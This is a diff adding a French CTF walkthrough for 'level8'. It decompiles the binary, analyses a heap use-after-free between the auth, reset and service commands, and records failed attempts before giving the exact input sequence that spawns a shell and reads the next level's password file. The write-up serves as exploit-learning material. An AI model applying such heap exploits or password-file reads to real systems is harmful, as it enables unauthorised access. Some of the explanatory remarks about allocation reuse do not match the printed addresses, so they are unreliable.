@@ -1,0 +1,85 @@
+1. ls -la
+   -> level8
+
+2. ./level8
+   -> "(nil), (nil)" + attend une commande
+
+3. ./level8 test
+   -> "(nil), (nil)" (même chose)
+
+4. Ghidra : Decompile de main()
+   undefined4 main(void) {
+      while (true){
+         printf("%p, %p \n", auth, service); # affiche les pointeurs auth et service chaque tour
+         fgets(local_90, 0x80, stdin);
+         if (commande commence par "auth ") {
+            auth = malloc(4); # faille ? malloc(4) alloue 4 bytes, on peut write jusqu'à 30 bytes grâce au strcpy en bass -> buffer overflow
+            memset(auth, 0, 4);
+            if (strlen(arg) < 0x1f)
+               strcpy(auth, arg);
+         }
+         if (commande == "reset") {
+            free(auth); # free mém auth mais pointeur pas remis à NULL = use-after-free vulnerability ? (alloc réutilise le bloc libéré)
+         }
+         if (commande == "service") {
+            # big faille : strdup vérifie pas la taille de la string, vu que le malloc est fait après le free d'auth, il utilise la même
+            # allocation : https://owasp.org/www-community/vulnerabilities/Using_freed_memory?
+            service = strdup(arg);
+         }
+         if (commande == "login") {
+              # Lit un int à l'offset 0x20 depuis auth (32 en hexa). Vu qu'on malloc 4, on a pas touché à cette zone donc 0 de base -> "Password:" affiché
+              # Ce qu'on peut faire, c'est du coup malloc (+ cpy) into reset into service et le strdup va utiliser l'adresse de auth comme départ pour l'alloc (comportement de base de l'allocateur)
+              # Avec une string assez longue on arrive jusqu'à un offset de 32 et on remplace la valeur par un truc non-nul
+            if (*(int *)(auth + 0x20) == 0)
+               fwrite("Password:\n", ...);
+            else
+               system("/bin/sh");
+         }
+      }
+   }
+
+5. Note pseudo-code :
+   Le pseudo-code contient des boucles do{}while -> c'est des strncmp/strlen/memset, ghidra ne les a pas reconnu
+
+6. first try : auth avec string longue
+   ./level8
+   auth AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+   login
+   -> "Password:" toujours affiché -> échec (le strcpy ne se fait mm pas psq la string est trop longue)
+
+7. second try : service direct pour voir si y'a un truc à faire avec le strdup
+   ./level8
+   service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+   login
+   -> Segmentation fault (core dumped)
+   gdb level8 / run / service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+   -> Program received signal SIGSEGV, 0x080486e7 in main ()
+   disas main pr voir c'est quoi le pb:
+     mov 0x20(%eax),%eax
+     test %eax,%eax
+     je <password>
+   -> c'est juste la ligne *(int *)(auth + 0x20) du "login" : malloc(4) n'a réservé qu'un tout petit bloc, lire 32 bytes
+      plus loin tombe dans une zone non mappée -> SIGSEGV.
+   -> "service" alloue un bloc ailleurs donc pas moyen d'affecter ce qui nous intéresse
+
+8. recherches vulnerabilités free/malloc :
+   https://blog.lamarranet.com/index.php/exploit-education-phoenix-heap-two-solution/
+   La technique : après free(), l'allocateur peut réuse exactement le même emplacement mémoire libéré pour
+   l'alloc d'après. Donc on libère auth avec reset et on alloue avec le strdup (string longue) de service
+
+9. Séquence d'exploitation (testée sur la VM) :
+   ./level8
+   auth AAAA
+   -> "0x804a008, (nil)"
+   reset
+   -> "0x804a008, (nil)"
+   service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+   -> "0x804a008, 0x804a018"
+   login
+   -> "$" # gigi well played
+
+10. whoami
+    -> level9
+
+11. cat /home/user/level9/.pass
+    -> (mot de passe de level9)
